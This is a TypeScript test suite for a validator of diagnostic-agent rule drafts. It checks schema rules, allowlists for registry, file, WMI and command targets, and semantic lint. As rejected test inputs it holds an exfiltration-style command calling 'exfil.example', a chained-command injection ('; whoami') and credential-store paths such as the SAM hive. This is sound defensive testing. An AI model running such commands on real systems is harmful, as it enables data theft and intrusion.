/**
 * Matrix tests for the MCP-local rule draft validator: schema layer, guardrail
 * layer (agent matching semantics), and the semantic lint that catches
 * schema-valid-but-silently-dead rules.
 */
import { describe, it, expect } from 'vitest';
import { validateRuleDraft, type ValidationFinding } from '../rule-validation.js';

const errors = (findings: ValidationFinding[]) => findings.filter((f) => f.level === 'error').map((f) => f.message);
const warnings = (findings: ValidationFinding[]) => findings.filter((f) => f.level === 'warning').map((f) => f.message);

function validGather(): Record<string, unknown> {
  return {
    ruleId: 'GATHER-DEVICE-101',
    title: 'Pending file renames',
    collectorType: 'registry',
    target: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending',
    trigger: 'startup',
    outputEventType: 'gather_pending_file_renames',
  };
}

function validAnalyze(): Record<string, unknown> {
  return {
    ruleId: 'ANALYZE-APP-101',
    title: 'Repeated install failures',
    severity: 'high',
    category: 'apps',
    baseConfidence: 55,
    confidenceThreshold: 50,
    conditions: [
      {
        signal: 'app_retry_storm',
        source: 'event_count',
        eventType: 'app_install_failed',
        dataField: 'appId',
        operator: 'count_per_group_gte',
        value: '3',
        required: true,
      },
    ],
    explanation: 'App {{appName}} failed repeatedly (last error {{errorCode}}).',
  };
}

describe('type detection', () => {
  it('detects gather via collectorType and analyze via conditions', () => {
    expect(validateRuleDraft(validGather()).ruleType).toBe('gather');
    expect(validateRuleDraft(validAnalyze()).ruleType).toBe('analyze');
  });

  it('unknown shape yields a single explanatory error', () => {
    const r = validateRuleDraft({ title: 'what am I' });
    expect(r.ruleType).toBe('unknown');
    expect(r.valid).toBe(false);
    expect(r.findings).toHaveLength(1);
  });
});

describe('schema layer', () => {
  it('valid drafts pass', () => {
    expect(validateRuleDraft(validGather()).valid).toBe(true);
    expect(validateRuleDraft(validAnalyze()).valid).toBe(true);
  });

  it('missing required fields fail with schema errors', () => {
    const gather = validGather();
    delete gather.outputEventType;
    expect(errors(validateRuleDraft(gather).findings).some((m) => m.includes('outputEventType'))).toBe(true);

    const analyze = validAnalyze();
    delete analyze.explanation;
    expect(errors(validateRuleDraft(analyze).findings).some((m) => m.includes('explanation'))).toBe(true);
  });

  it('enum violations and unknown properties fail', () => {
    const bad = validAnalyze();
    bad.severity = 'catastrophic';
    (bad as Record<string, unknown>).madeUpField = 1;
    const msgs = errors(validateRuleDraft(bad).findings);
    expect(msgs.some((m) => m.includes('/severity'))).toBe(true);
    expect(msgs.some((m) => m.includes('additional'))).toBe(true);
  });

  it('bad ruleId pattern fails', () => {
    const bad = validGather();
    bad.ruleId = 'GATHER-device-1';
    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('/ruleId'))).toBe(true);
  });
});

describe('gather guardrails (agent matching semantics)', () => {
  it('accepts an allow-listed registry target with hive prefix', () => {
    expect(validateRuleDraft(validGather()).valid).toBe(true);
  });

  it('rejects a registry target outside the allowlist', () => {
    const bad = validGather();
    bad.target = 'HKLM\\SOFTWARE\\Contoso\\Secrets';
    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('registry target'))).toBe(true);
  });

  it('rejects prefix spoofing (segment boundary)', () => {
    const bad = validGather();
    bad.target = 'HKLM\\SOFTWARE\\Microsoft\\EnrollmentsEvil\\x'; // "...\\Enrollments" is allowed, "EnrollmentsEvil" is not
    expect(validateRuleDraft(bad).valid).toBe(false);
  });

  it('rejects hard-blocked file paths even though C:\\Users is not in filePrefixes', () => {
    const bad = validGather();
    bad.collectorType = 'file';
    bad.target = 'C:\\Users\\admin\\secret.txt';
    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('hard-blocked'))).toBe(true);
  });

  it('rejects the registry-hive store path (System32\\config) as hard-blocked', () => {
    const bad = validGather();
    bad.collectorType = 'file';
    bad.target = 'C:\\Windows\\System32\\config\\SAM';
    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('hard-blocked'))).toBe(true);
  });

  it('validates json/xml targets with file-path semantics', () => {
    const okJson = validGather();
    okJson.collectorType = 'json';
    okJson.target = 'C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\state.json';
    expect(validateRuleDraft(okJson).valid).toBe(true);

    const blockedJson = validGather();
    blockedJson.collectorType = 'json';
    blockedJson.target = 'C:\\Users\\admin\\AppData\\Local\\app\\state.json';
    expect(errors(validateRuleDraft(blockedJson).findings).some((m) => m.includes('hard-blocked'))).toBe(true);

    const badXml = validGather();
    badXml.collectorType = 'xml';
    badXml.target = 'D:\\NotAllowed\\config.xml';
    expect(errors(validateRuleDraft(badXml).findings).some((m) => m.includes('allowed file prefix'))).toBe(true);
  });

  it('rejects hard-blocked command patterns and over-length commands', () => {
    const blocked = validGather();
    blocked.collectorType = 'command_allowlisted';
    blocked.target = 'Get-Tpm; Invoke-WebRequest -Uri https://exfil.example';
    expect(errors(validateRuleDraft(blocked).findings).some((m) => m.includes('hard-blocked pattern'))).toBe(true);

    const long = validGather();
    long.collectorType = 'command_allowlisted';
    long.target = 'Get-Something ' + 'a'.repeat(2100);
    expect(errors(validateRuleDraft(long).findings).some((m) => m.includes('character hard limit'))).toBe(true);
  });

  it('still accepts allowlisted commands that contain no blocked pattern', () => {
    const ok = validGather();
    ok.collectorType = 'command_allowlisted';
    // must not be caught by the "certutil -urlcache" pattern
    ok.target = 'certutil -store My';
    expect(validateRuleDraft(ok).valid).toBe(true);
  });

  it('rejects activePhases + activeFromPhase set together (backend 400 parity)', () => {
    const bad = validGather();
    bad.activePhases = ['DeviceSetup'];
    bad.activeFromPhase = 'AccountSetup';
    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('mutually exclusive'))).toBe(true);

    const okPhases = validGather();
    okPhases.activePhases = ['DeviceSetup'];
    expect(validateRuleDraft(okPhases).valid).toBe(true);

    const okFrom = validGather();
    okFrom.activeFromPhase = 'AccountSetup';
    expect(validateRuleDraft(okFrom).valid).toBe(true);
  });

  it('accepts an allow-listed file target and rejects others', () => {
    const ok = validGather();
    ok.collectorType = 'file';
    ok.target = 'C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\IntuneManagementExtension.log';
    expect(validateRuleDraft(ok).valid).toBe(true);

    const bad = validGather();
    bad.collectorType = 'file';
    bad.target = 'C:\\Temp\\anything.log';
    expect(validateRuleDraft(bad).valid).toBe(false);
  });

  it('WMI: prefix must be whitespace-bounded', () => {
    const ok = validGather();
    ok.collectorType = 'wmi';
    ok.target = 'SELECT * FROM Win32_BIOS WHERE PrimaryBIOS = TRUE';
    expect(validateRuleDraft(ok).valid).toBe(true);

    const spoof = validGather();
    spoof.collectorType = 'wmi';
    spoof.target = 'SELECT * FROM Win32_BIOSX';
    expect(validateRuleDraft(spoof).valid).toBe(false);
  });

  it('WMI: property projection of an allowed class is admitted', () => {
    const single = validGather();
    single.collectorType = 'wmi';
    single.target = 'SELECT BatteryStatus FROM Win32_Battery';
    expect(validateRuleDraft(single).valid).toBe(true);

    const multi = validGather();
    multi.collectorType = 'wmi';
    multi.target = 'SELECT BatteryStatus, EstimatedChargeRemaining FROM Win32_Battery WHERE BatteryStatus = 1';
    expect(validateRuleDraft(multi).valid).toBe(true);
  });

  it('WMI: projection of a disallowed class and star-in-list are rejected', () => {
    const badClass = validGather();
    badClass.collectorType = 'wmi';
    badClass.target = 'SELECT Name FROM Win32_Process';
    expect(validateRuleDraft(badClass).valid).toBe(false);

    const starMix = validGather();
    starMix.collectorType = 'wmi';
    starMix.target = 'SELECT *, Name FROM Win32_BIOS';
    expect(validateRuleDraft(starMix).valid).toBe(false);
  });

  it('WMI: leading whitespace is trimmed like the agent does (no false positive)', () => {
    const padded = validGather();
    padded.collectorType = 'wmi';
    padded.target = '  SELECT * FROM Win32_BIOS';
    expect(validateRuleDraft(padded).valid).toBe(true);
  });

  it('commands match exactly — extra arguments are rejected', () => {
    const ok = validGather();
    ok.collectorType = 'command_allowlisted';
    ok.target = 'dsregcmd /status';
    expect(validateRuleDraft(ok).valid).toBe(true);

    const bad = validGather();
    bad.collectorType = 'command_allowlisted';
    bad.target = 'dsregcmd /status; whoami';
    expect(validateRuleDraft(bad).valid).toBe(false);
  });

  it('event log: hard-blocked channels rejected, allow-listed channel with /Admin suffix accepted', () => {
    const blocked = validGather();
    blocked.collectorType = 'eventlog';
    blocked.target = 'Security';
    expect(errors(validateRuleDraft(blocked).findings).some((m) => m.includes('hard-blocked'))).toBe(true);

    const ok = validGather();
    ok.collectorType = 'eventlog';
    ok.target = 'Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider/Admin';
    expect(validateRuleDraft(ok).valid).toBe(true);
  });
});

describe('logparser parameter lint', () => {
  function logparserRule(parameters: Record<string, unknown>): Record<string, unknown> {
    const r = validGather();
    r.collectorType = 'logparser';
    r.target = 'C:\\Windows\\Logs\\CustomApp\\install.log';
    r.parameters = parameters;
    return r;
  }

  it('missing pattern is an error', () => {
    expect(errors(validateRuleDraft(logparserRule({})).findings).some((m) => m.includes('parameters.pattern'))).toBe(true);
  });

  it('non-compiling pattern is an error', () => {
    expect(errors(validateRuleDraft(logparserRule({ pattern: '([unclosed' })).findings)
      .some((m) => m.includes('does not compile'))).toBe(true);
  });

  it('valid pattern yields the .NET/case-sensitivity info pointing to test_log_pattern', () => {
    const r = validateRuleDraft(logparserRule({ pattern: '(?<level>ERROR)', format: 'text' }));
    expect(r.valid).toBe(true);
    expect(r.findings.some((f) => f.level === 'info' && f.message.includes('test_log_pattern'))).toBe(true);
  });

  it('unknown format value warns (agent silently treats it as cmtrace)', () => {
    expect(warnings(validateRuleDraft(logparserRule({ pattern: 'x', format: 'json' })).findings)
      .some((m) => m.includes('CMTrace mode'))).toBe(true);
  });
});

describe('gather semantic lint', () => {
  it('interval without intervalSeconds is an error; on_event without triggerEventType is an error', () => {
    const a = validGather();
    a.trigger = 'interval';
    expect(errors(validateRuleDraft(a).findings).some((m) => m.includes('intervalSeconds'))).toBe(true);

    const b = validGather();
    b.trigger = 'on_event';
    expect(errors(validateRuleDraft(b).findings).some((m) => m.includes('triggerEventType'))).toBe(true);
  });

  it('outputEventType colliding with a built-in event type warns', () => {
    const bad = validGather();
    bad.outputEventType = 'app_install_failed';
    expect(warnings(validateRuleDraft(bad).findings).some((m) => m.includes('collides'))).toBe(true);
  });

  it('outputEventType without gather_ prefix warns', () => {
    const r = validGather();
    r.outputEventType = 'pending_file_renames';
    expect(warnings(validateRuleDraft(r).findings).some((m) => m.includes('gather_'))).toBe(true);
  });
});

describe('analyze semantic lint', () => {
  it('unreachable threshold is an error, above-base-with-factors is info', () => {
    const dead = validAnalyze();
    dead.confidenceThreshold = 90;
    dead.baseConfidence = 50;
    expect(errors(validateRuleDraft(dead).findings).some((m) => m.includes('never fire'))).toBe(true);

    const corroborated = validAnalyze();
    corroborated.confidenceThreshold = 60;
    corroborated.confidenceFactors = [{ signal: 'enrollment_failed', condition: 'count >= 1', weight: 15 }];
    const r = validateRuleDraft(corroborated);
    expect(r.valid).toBe(true);
    expect(r.findings.some((f) => f.level === 'info' && f.message.includes('confidence factors'))).toBe(true);
  });

  it('non-evaluable factor condition shapes are errors', () => {
    for (const condition of ['count > 3', 'Count >= 3', 'phase_duration >= 30', 'always']) {
      const bad = validAnalyze();
      bad.confidenceFactors = [{ signal: 'x', condition, weight: 10 }];
      expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('not evaluable')), condition).toBe(true);
    }
  });

  it('"exists" factor pointing at a non-existent signal warns', () => {
    const bad = validAnalyze();
    bad.confidenceFactors = [{ signal: 'no_such_signal', condition: 'exists', weight: 10 }];
    expect(warnings(validateRuleDraft(bad).findings).some((m) => m.includes('no_such_signal'))).toBe(true);
  });

  it('unknown event types warn; gather_ event types are info', () => {
    const unknown = validAnalyze();
    (unknown.conditions as Array<Record<string, unknown>>)[0].eventType = 'made_up_event';
    expect(warnings(validateRuleDraft(unknown).findings).some((m) => m.includes('made_up_event'))).toBe(true);

    const gatherRef = validAnalyze();
    (gatherRef.conditions as Array<Record<string, unknown>>)[0].eventType = 'gather_pending_file_renames';
    const r = validateRuleDraft(gatherRef);
    expect(r.valid).toBe(true);
    expect(r.findings.some((f) => f.level === 'info' && f.message.includes('gather_'))).toBe(true);
  });

  it('duplicate signals and correlation without joinField are errors', () => {
    const dup = validAnalyze();
    (dup.conditions as Array<Record<string, unknown>>).push({
      signal: 'app_retry_storm', source: 'event_type', eventType: 'os_info', operator: 'exists', value: '',
    });
    expect(errors(validateRuleDraft(dup).findings).some((m) => m.includes('duplicate signal'))).toBe(true);

    const corr = validAnalyze();
    (corr.conditions as Array<Record<string, unknown>>)[0] = {
      signal: 'pair', source: 'event_correlation', eventType: 'app_install_started', correlateEventType: 'app_install_failed',
    };
    expect(errors(validateRuleDraft(corr).findings).some((m) => m.includes('joinField'))).toBe(true);
  });

  it('invalid regex is an error; unanchored not_regex warns', () => {
    const bad = validAnalyze();
    (bad.conditions as Array<Record<string, unknown>>)[0] = {
      signal: 's', source: 'event_data', eventType: 'app_install_failed', dataField: 'errorCode', operator: 'regex', value: '([unclosed',
    };
    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('not a valid regex'))).toBe(true);

    const unanchored = validAnalyze();
    (unanchored.conditions as Array<Record<string, unknown>>)[0] = {
      signal: 's', source: 'event_data_array', eventType: 'provisioning_package_scan', dataField: 'artifacts',
      itemField: 'identity', operator: 'not_regex', value: 'Microsoft\\.Windows',
    };
    expect(warnings(validateRuleDraft(unanchored).findings).some((m) => m.includes('anchored'))).toBe(true);
  });

  it('unresolvable {{tokens}} warn, resolvable ones (dataField/auto/signal) do not', () => {
    const r = validateRuleDraft(validAnalyze());
    // {{appName}} + {{errorCode}} are auto-captured fields → no warning.
    expect(warnings(r.findings).filter((m) => m.includes('{{'))).toEqual([]);

    const bad = validAnalyze();
    bad.explanation = 'Value is {{nonexistent_token}}.';
    expect(warnings(validateRuleDraft(bad).findings).some((m) => m.includes('nonexistent_token'))).toBe(true);
  });

  it('markSessionAsFailedDefault=true yields an info finding', () => {
    const ko = validAnalyze();
    ko.markSessionAsFailedDefault = true;
    expect(validateRuleDraft(ko).findings.some((f) => f.level === 'info' && f.message.includes('KO criterion'))).toBe(true);
  });
});

describe('reserved built-in namespace', () => {
  it('warns for numeric built-in-shaped IDs (backend rejects tenant creates with 409)', () => {
    const a = validateRuleDraft(validAnalyze()); // ANALYZE-APP-101
    expect(a.valid).toBe(true); // warning only — platform built-ins legitimately live here
    expect(warnings(a.findings).some((m) => m.includes('reserved built-in namespace'))).toBe(true);

    const g = validateRuleDraft(validGather()); // GATHER-DEVICE-101
    expect(warnings(g.findings).some((m) => m.includes('reserved built-in namespace'))).toBe(true);
  });

  it('case variants are covered', () => {
    const r = validateRuleDraft({ ...validAnalyze(), ruleId: 'ANALYZE-SEC-002' });
    expect(warnings(r.findings).some((m) => m.includes("'ANALYZE-SEC-002'"))).toBe(true);
  });

  it('the CUSTOM category is the sanctioned tenant namespace and stays clean', () => {
    const a = validateRuleDraft({ ...validAnalyze(), ruleId: 'ANALYZE-CUSTOM-001' });
    expect(warnings(a.findings).some((m) => m.includes('reserved built-in namespace'))).toBe(false);

    const g = validateRuleDraft({ ...validGather(), ruleId: 'GATHER-CUSTOM-101' });
    expect(warnings(g.findings).some((m) => m.includes('reserved built-in namespace'))).toBe(false);
  });
});
